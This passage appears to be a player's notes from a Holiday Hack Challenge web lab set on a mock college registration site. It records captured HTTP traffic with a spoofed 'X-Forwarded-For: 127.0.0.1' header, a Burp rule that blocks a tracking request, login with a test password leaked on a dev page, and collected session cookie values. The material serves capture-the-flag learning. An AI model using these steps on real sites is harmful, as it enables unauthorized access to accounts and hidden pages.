Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: registration=eb72a05369dcb455; Path=/
X-Cloud-Trace-Context: 9c06be1593b3f99c1de936d0856f63be;o=1
Date: Wed, 03 Dec 2025 23:54:50 GMT
Server: Google Frontend
Content-Length: 4918
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Legacy Todos</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/gnome-character.css">
    <link rel="stylesheet" href="/register/css/commonO.css">
    <link rel="stylesheet" href="/register/css/notification.css">
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    
    <div class="notification">In-scope vulnerability found and reported!</div>
    
    <main id="elfStyle">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome oTitle" role="banner">Updated Developer To Do List</p>
        </header>
        <section class="oContent">
            <div class="oContainer">
                <pre class="env-code" style="font-size: clamp(1rem, 4vw, 1.3rem);">- [ ] Patch XSS
- [ ] Remove 'dev_notes' from 'dev' folder
- [X] Enforce Login Header (which one TBD)
- [X] Update 'teststudent' password to '2025h0L1d4y5'</pre>
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
        <div class="gnome-character-container">
            <img src="/register/images/gnome-hacker.png" alt="Gnome Hacker" class="gnome-image">
            <div class="speech-bubble">
                <span class="initial-text">I wonder if that password will work.</span>
                <span class="hover-text">Can&#39;t hurt to try it, right?</span>
            </div>
        </div>
    </main>
</body>
</html>
```
### otros

```
X-Forwarded-For: 127.0.0.1


https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report?id=d116a229-4021-45ff-a1bb-c6024a9e5850
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset?removeAll=&id=d116a229-4021-45ff-a1bb-c6024a9e5850
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset?id=d116a229-4021-45ff-a1bb-c6024a9e5850
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report?id=d116a229-4021-45ff-a1bb-c6024a9e5850
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/gnomeU/?id=d116a229-4021-45ff-a1bb-c6024a9e5850
```

## Pasos

### Bloquear al gnomo

**Opción 1: Bloquear la petición completa**

- **Type**: Request first line
- **Match**: `^GET /gnomeU.*`
- **Replace**: `GET /register/images/favicon.ico` (reemplazar por algo inofensivo)
- **Regex match**: ✓ (activado)


## js

```

```




# Cosas logradas

```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/dev/dev_todos?id=d116a229-4021-45ff-a1bb-c6024a9e5850
- [ ] Patch XSS
- [ ] Remove 'dev_notes' from 'dev' folder
- [X] Enforce Login Header (which one TBD)
- [X] Update 'teststudent' password to '2025h0L1d4y5'


https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
teststudent
2025h0L1d4y5

<section class="courses-content"> <div class="courses-container" style="max-width: 500px;"> <h2 class="semester-heading">❄️ Spring Semester 2026 ❄️</h2> <!-- Should provide course listing here eventually instead of the extra step through search flow. --> <!-- <ul id="courseSearch" class="courses-list"> <li><a href="/register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850">Course Search</a></li> </ul> --> </div>




https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/dev/dev_notes/?id=d116a229-4021-45ff-a1bb-c6024a9e5850
The new course, holiday_behavior is still a wip (work-in-progress).
 

eb72a05369dcb448
eb72a05369dcb447
eb72a05369dcb451
eb72a05369dcb443
eb72a05369dcb444


7ac61b38-167f-4268-8f76-8d594b01527a
eb72a05369dcb443
 
```


```
curl "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/js/home.js"
function toggleInstructions() {
    const rules = document.getElementById('rules');
    const instBtn = document.getElementById('instBtn');
    const isVisible = rules.classList.toggle('visible');

    rules.setAttribute('aria-hidden', !isVisible);
    instBtn.setAttribute('aria-expanded', isVisible);

    if (isVisible) {
        document.body.style.overflow = 'hidden';
        setTimeout(() => document.getElementById('closeInstructions').focus(), 100);

        const instructions = document.getElementById('instructions');
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
        const rulesElement = document.getElementById('rules');
        const closeButton = document.getElementById('closeInstructions');
        const buttonHeight = closeButton ? closeButton.offsetHeight + 20 : 80; // Add padding

        if (instructions) {
            instructions.style.maxHeight = `${viewportHeight * 0.85 - buttonHeight}px`;
        }
    } else {
        document.body.style.overflow = '';
        instBtn.focus();
    }
}

function createSnowflakes() {
    const snowflakesContainer = document.getElementById('snowflakes');
    if (!snowflakesContainer) return;

    snowflakesContainer.innerHTML = '';

    for (let i = 0; i < 50; i++) {
        const snowflake = document.createElement('div');
        snowflake.className = 'snowflake';
        snowflake.textContent = '❄';
        snowflake.style.left = `${Math.random() * 100}%`;
        snowflake.style.opacity = Math.random() * 0.7 + 0.3;
        snowflake.style.fontSize = `${Math.random() * 1 + 0.8}rem`;
        snowflake.style.animationDuration = `${Math.random() * 20 + 5}s`;

        snowflake.addEventListener('animationiteration', () => {
            snowflake.style.left = `${Math.random() * 100}%`;
        });

        snowflakesContainer.appendChild(snowflake);
    }
}

function createSnowParticles() {
    const snowContainer = document.getElementById('snowDemo');
    if (!snowContainer) return;

    const numberOfParticles = 50;

    for (let i = 0; i < numberOfParticles; i++) {
        const particle = document.createElement('div');
        particle.className = 'snow-particle';

        const size = 1 + Math.random() * 5;
        const posX = Math.random() * 100;
        const animationDuration = 1 + Math.random() * 3;
        const animationDelay = Math.random() * 2;

        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${posX}%`;
        particle.style.animationDuration = `${animationDuration}s`;
        particle.style.animationDelay = `${animationDelay}s`;

        snowContainer.appendChild(particle);
    }
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && document.getElementById('rules').classList.contains('visible')) {
        toggleInstructions();
    }
});

document.addEventListener("DOMContentLoaded", () => {
    createSnowflakes();
    createSnowParticles();

    document.getElementById('instBtn').addEventListener('click', function(e) {
        e.preventDefault();
        toggleInstructions();
    });

    document.getElementById('closeInstructions').addEventListener('click', function() {
        toggleInstructions();
    });

    document.getElementById('rules').addEventListener('click', function(e) {
        if (e.target === this) {
            toggleInstructions();
        }
    });
});%
```

```
curl "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/js/idparam-propagation.js"
(function () {
  document.addEventListener("DOMContentLoaded", function () {
    const urlParam = new URLSearchParams(window.location.search).get("id");
    if (urlParam) {
      sessionStorage.setItem("id", urlParam);
    }

    const myParam = sessionStorage.getItem("id");
    if (!myParam) return;

    document.querySelectorAll("a[href]").forEach(link => {
      try {
        const url = new URL(link.href, window.location.origin);
        if (!url.searchParams.has("id")) {
          url.searchParams.set("id", myParam);
          link.href = url.toString();
        }
      } catch (e) {
        console.warn("Invalid link:", link.href);
      }
    });

    document.querySelectorAll("form").forEach(form => {
      if (!form.querySelector('input[name="id"]')) {
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = "id";
        input.value = myParam;
        form.appendChild(input);
      }
    });    const miniGnome = document.getElementById('mini-gnome');
    if (miniGnome && miniGnome.src.includes('/gnomeU')) {
      const imgUrl = new URL(miniGnome.src, window.location.origin);
      if (!imgUrl.searchParams.has('id')) {
        imgUrl.searchParams.set('id', myParam);
        miniGnome.src = imgUrl.toString();
      }
    }
  });

  const originalFetch = window.fetch;
  window.fetch = function (input, init = {}) {
    const myParam = sessionStorage.getItem("id");
    if (!myParam) return originalFetch(input, init);

    let urlObj;
    if (typeof input === "string") {
      urlObj = new URL(input, window.location.origin);
    } else if (input instanceof Request) {
      urlObj = new URL(input.url, window.location.origin);
    } else {
      console.warn("Unhandled fetch input type", input);
      return originalFetch(input, init);
    }

    if (!urlObj.searchParams.has("id")) {
      urlObj.searchParams.set("id", myParam);
    }

    if (typeof input === "string") {
      input = urlObj.toString();
    } else {
      input = new Request(urlObj.toString(), input);
    }

    return originalFetch(input, init);
  };
})();%
```


```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/js/registerCourses.js

function checkAndReportCourseSearch() {
  const courseList = document.getElementById('courseSearch');
  if (courseList && !courseList.dataset.trapTriggered) {
    courseList.dataset.trapTriggered = "true";

    fetch('/register/courseSearchUnlocked', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Course search was uncommented!',
        timestamp: Date.now(),
        linkCount: courseList.querySelectorAll('a').length
      })
    })
    .then(response => response.json())    .then(data => {
      if (data.status === 'success' && data.initialText && data.hoverText) {
        document.querySelector('.speech-bubble .initial-text').innerHTML = data.initialText;
        document.querySelector('.speech-bubble .hover-text').innerHTML = data.hoverText;
        if (data.showNotification) {
          showVulnerabilityNotification(data.notificationText || 'In-scope vulnerability found!');
        }
      }
    })
    .catch(error => console.error('Error updating gnome text:', error));
  }
}

const observer = new MutationObserver(checkAndReportCourseSearch);
observer.observe(document.body, { childList: true, subtree: true });

window.addEventListener('DOMContentLoaded', checkAndReportCourseSearch);

function showVulnerabilityNotification(notificationText) {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.textContent = notificationText;
  document.body.appendChild(notification);
  
  setTimeout(() => {
    notification.remove();
  }, 5000);
}

```

```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/js/course_common.js
function createCookieShowcase() {
    const cookieDisplay = document.getElementById('cookieDisplay');
    if (!cookieDisplay) return;
    
    cookieDisplay.innerHTML = '';
    const cookies = [
        '🍪', '🥮', '🥠', '🍩', '🍰', '🧁', '🍪', '🥮', '🥠', '🍩', '🍰', '🧁'
    ];
    
    cookies.forEach((cookie, index) => {
        const cookieEl = document.createElement('span');
        cookieEl.className = 'cookie';
        cookieEl.textContent = cookie;
        cookieEl.style.animationDelay = `${index * 0.1}s`;
        cookieDisplay.appendChild(cookieEl);
    });
    
    setupCookieScroll();
}

function setupCookieScroll() {
    const cookieDisplay = document.getElementById('cookieDisplay');
    const leftBtn = document.getElementById('cookieScrollLeft');
    const rightBtn = document.getElementById('cookieScrollRight');
    
    if (!cookieDisplay || !leftBtn || !rightBtn) return;
    
    function checkScrollability() {
        const isScrollable = cookieDisplay.scrollWidth > cookieDisplay.clientWidth;
        leftBtn.classList.toggle('hidden', !isScrollable || cookieDisplay.scrollLeft <= 0);
        rightBtn.classList.toggle('hidden', !isScrollable || 
            cookieDisplay.scrollLeft >= cookieDisplay.scrollWidth - cookieDisplay.clientWidth);
    }
    
    checkScrollability();
    
    leftBtn.addEventListener('click', () => {
        cookieDisplay.scrollBy({ left: -150, behavior: 'smooth' });
        setTimeout(checkScrollability, 350); 
    });
    
    rightBtn.addEventListener('click', () => {
        cookieDisplay.scrollBy({ left: 150, behavior: 'smooth' });
        setTimeout(checkScrollability, 350); 
    });
    
    cookieDisplay.addEventListener('scroll', () => {
        checkScrollability();
    });
    
    window.addEventListener('resize', () => {
        checkScrollability();
    });
}

function createReindeerProfiles() {
    const reindeerGallery = document.getElementById('reindeerGallery');
    if (!reindeerGallery) return;
    
    reindeerGallery.innerHTML = '';
    const table = document.createElement('table');
    table.className = 'reindeer-table';
    const thead = document.createElement('thead');
    thead.innerHTML = `
        <tr>
            <th>Name</th>
            <th>Speed</th>
            <th>Special Ability</th>
        </tr>
    `;
    table.appendChild(thead);
    const tbody = document.createElement('tbody');
    const reindeerTeam = [
        { name: "Dasher", speed: "Fast", specialAbility: "Quick turns" },
        { name: "Dancer", speed: "Medium", specialAbility: "Graceful flight" },
        { name: "Prancer", speed: "Medium", specialAbility: "Precise landing" },
        { name: "Vixen", speed: "Fast", specialAbility: "Weather sensing" },
        { name: "Comet", speed: "Very Fast", specialAbility: "Night vision" },
        { name: "Cupid", speed: "Medium", specialAbility: "Team coordination" },
        { name: "Donner", speed: "Fast", specialAbility: "Thunder resistance" },
        { name: "Blitzen", speed: "Very Fast", specialAbility: "Lightning resistance" },
        { name: "Rudolph", speed: "Very Fast", specialAbility: "Fog navigation" }
    ];
    
    reindeerTeam.forEach(reindeer => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td class="reindeer-name">${reindeer.name}</td>
            <td>${reindeer.speed}</td>
            <td>${reindeer.specialAbility}</td>
        `;
        tbody.appendChild(row);
    });
    
    table.appendChild(tbody);
    reindeerGallery.appendChild(table);
}

document.addEventListener('DOMContentLoaded', () => {
    createCookieShowcase();
    createReindeerProfiles();
});

```

```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/js/new_portal.js
document.addEventListener("DOMContentLoaded", function () {
  const loginForm = document.querySelector("#login-form");
  const messageBox = document.querySelector("#login-message");
  if (loginForm && messageBox) {
    loginForm.addEventListener("submit", function () {
      messageBox.textContent = "🔄 Attempting login...";
    });
  }
});

```

### Vulnerabilidad vlida

```
POST /register/courseSearchUnlocked?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb442
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Content-Type: application/json
Content-Length: 84
Origin: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
X-Forwarded-For: 127.0.0.1

{"message":"Course search was uncommented!","timestamp":1764823809586,"linkCount":1}


HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: registration=eb72a05369dcb454; Path=/
X-Cloud-Trace-Context: 7fb63bec965360f393cbfedc46f19624
Date: Thu, 04 Dec 2025 04:52:50 GMT
Server: Google Frontend
Content-Length: 403
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

{"hoverText":"... a student search <a href=\"/search/student_lookup?id=d116a229-4021-45ff-a1bb-c6024a9e5850\"><font color=\"red\">here</font></a>. Worth a look, dont you think?","initialText":"Nice! You know what? My friends and I also found ...","message":"Course search unlocked successfully","notificationText":"In-scope vulnerability found and reported!","showNotification":true,"status":"success"}

```


```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850

POST /register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb44b
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1

courseNumber=0&id=d116a229-4021-45ff-a1bb-c6024a9e5850


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: registration=eb72a05369dcb452; Path=/
X-Cloud-Trace-Context: 6e76f601e20a864655d6ea96c05f19dd;o=1
Date: Thu, 04 Dec 2025 04:59:21 GMT
Server: Google Frontend
Content-Length: 6406
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Search</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/commonO.css">
    <link rel="stylesheet" href="/register/css/gnome-character.css">
    <link rel="stylesheet" href="/register/css/course-search-form.css">
    <link rel="stylesheet" href="/register/css/search-results.css">
    <link rel="stylesheet" href="/register/css/notification.css">
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    
    <main id="elfStyle" style="top: 10vh;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome oTitle" role="banner">🎄 Neighborhood College Course Search</p>
        </header>
        <section class="oContent">
            <div class="oContainer">
                <form method="POST" class="course-search-form">
                    <div class="form-group inline-form-group">                
                        <label for="courseNumber">Enter course number:</label>
                        <input type="text" id="courseNumber" name="courseNumber" placeholder="(000-999)" style="width: 90px !important;" value="0">
                    </div>
                    <div class="button-container">                
                        <input type="submit" value="Lookup">
                    </div>
                </form>
                
                
                <div class="search-results">
                    <h3>Search Results:</h3>
                    <ul class="courses-list" style="font-size: 1rem; text-align: left;">
                        
                        <li>
                            <a href="/register/courses/toy_making">HOL 101 - Holiday Toy Making Fundamentals</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/snow_dynamics">HOL 202 - Advanced Snow Dynamics</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/reindeer_care">HOL 405 - Reindeer Care and Guidance</a>
                        </li>
                        
                    </ul>
                </div>
                
                
                <p class="warning-message">Not all courses are available for the upcoming term. Please only register for Spring 2026 courses.</p>
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
        <div class="gnome-character-container">
            <img src="/register/images/gnome-hacker.png" alt="Gnome Hacker" class="gnome-image">
            <div class="speech-bubble">
                <span class="initial-text">I'm sure there are other courses to be found ...</span>
                <span class="hover-text">... if you know how and where to look for them.</span>
            </div>
        </div>
    </main>
</body>
</html>
```



```
https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/toy_making?id=d116a229-4021-45ff-a1bb-c6024a9e5850

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Holiday Toy Making Fundamentals</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <!-- Common course page styles -->
<style>
    .course-banner {
        background: linear-gradient(to right, #e74c3c, #c0392b);
        border-radius: 8px;
        color: white;
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }
    
    .course-icon {
        font-size: 2.5rem;
    }
    
    .course-details {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 1.5rem;
        margin-bottom: 1rem;
    }
    
    .course-section {
        background: rgba(255, 255, 255, 0.9);
        padding: .5rem;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .courses-content {
        width: 100%;
        display: flex;
        justify-content: center;
    }

    .courses-container {
        position: relative;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 10px;
        width: 90%;
        max-width: 1100px;
        margin: 0 auto;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .courses-list {
        text-align: left;
        background: transparent;
        padding: 0;
        font-size: clamp(0.9rem, 1.7vw, 1.3rem);
    }

    .courses-list li {
        padding: 0.5rem 0;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        white-space: normal;
        line-height: 1.3;
    }

    .courses-list a {
        display: inline-block;
    }
    
    .course-banner p {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        background: transparent;
    }

    .course-section h2 {
        font-size: clamp(1.2rem, 2.5vw, 1.8rem);
        margin-bottom: 0.8rem;
    }

    .course-section p, 
    .course-section li {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        line-height: 1.4;
        margin-bottom: 0.5rem;
        font-size: .9rem;
    }

    .instructor-section {
        display: flex;
        align-items: center;
        gap: 1.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        margin-bottom: 1rem;
        justify-content: center;
    }
    
    .instructor-section h3 {
        font-size: clamp(1.1rem, 2.2vw, 1.5rem);
    }

    .instructor-section p {
        font-size: clamp(0.8rem, 1.8vw, 1.1rem);
        background: transparent;
        margin: 0;
        padding: 0;
    }

    .instructor-avatar {
        background: #2ecc71;
        color: white;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.5rem;
    }

    h2.semester-heading, 
    .courses-container > h2 {
        white-space: nowrap;
        font-size: 1.5rem;
        margin: 1rem 0;
        text-align: center;
    }
    
    ul {
        background: var(--panel-bg);
        padding: 1rem;
        border-radius: 10px;
        list-style-type: square;
        margin-bottom: 1rem;
        text-align: left;
    }

    .back-to-search {
        position: fixed;
        bottom: 15px;
        right: 15px;
        background-color: rgba(210, 39, 54, 0.85);
        color: white;
        padding: 5px 10px;
        border-radius: 15px;
        font-size: 0.75rem;
        text-decoration: none;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        z-index: 1000; 
        transition: all 0.3s ease;
        white-space: nowrap;
        max-width: 90px;
        overflow: hidden;
        text-overflow: ellipsis;
        opacity: 0.85;
        transform: translate(0, 0);
    }
    
    .back-to-search:hover {
        background-color: rgba(210, 39, 54, 1);
        opacity: 1;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    .back-to-search::before {
        content: "←";
        margin-right: 3px;
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            bottom: 65px; 
            right: 10px;
            font-size: 0.7rem;
            padding: 4px 8px;
            max-width: 80px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            bottom: 70px;
            right: 10px;
            font-size: 0.7rem;
            padding: 3px 7px;
            max-width: 75px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            bottom: 80px;
            right: 8px;
            font-size: 0.65rem;
            padding: 3px 6px;
            max-width: 70px;
        }
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            font-size: 0.8rem;
            padding: 5px 10px;
            bottom: 20px;
            right: 20px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            font-size: 0.75rem;
            padding: 4px 8px;
            bottom: 15px;
            right: 15px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            font-size: 0.7rem;
            padding: 4px 8px;
            bottom: 60px;
            right: 10px;
        }
    }
    
    @media (max-width: 320px) {
        .back-to-search {
            font-size: 0.65rem;
            padding: 3px 7px;
            bottom: 70px;
            right: 5px;
        }
    }
    
    /* Cookie showcase styles */
    .cookie-showcase {
        display: flex;
        justify-content: space-around;
        align-items: center;
        margin: 1.5rem 0;
        padding: 1rem;
        background: rgba(255, 255, 255, 0.8);
        border-radius: 8px;
        height: 120px;
    }
    
